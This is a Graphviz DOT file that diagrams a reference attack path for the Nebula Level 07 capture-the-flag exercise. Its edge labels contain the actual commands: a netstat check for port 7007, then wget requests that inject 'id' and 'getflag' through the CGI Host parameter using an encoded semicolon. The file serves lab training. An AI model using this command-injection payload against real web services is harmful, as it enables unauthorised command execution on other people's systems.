digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Nebula Level 07"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Service identified"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Host parameter injection confirmed"];
  node2 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Execution as flag07 obtained"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="netstat -lntp 2>/dev/null | grep 7007"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="wget \"http://127.0.0.1:7007/index.cgi?Host=127.0.0.1%3Bid\" -O /tmp/out"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="wget \"http://127.0.0.1:7007/index.cgi?Host=127.0.0.1%3Bgetflag\" -O -"];
}
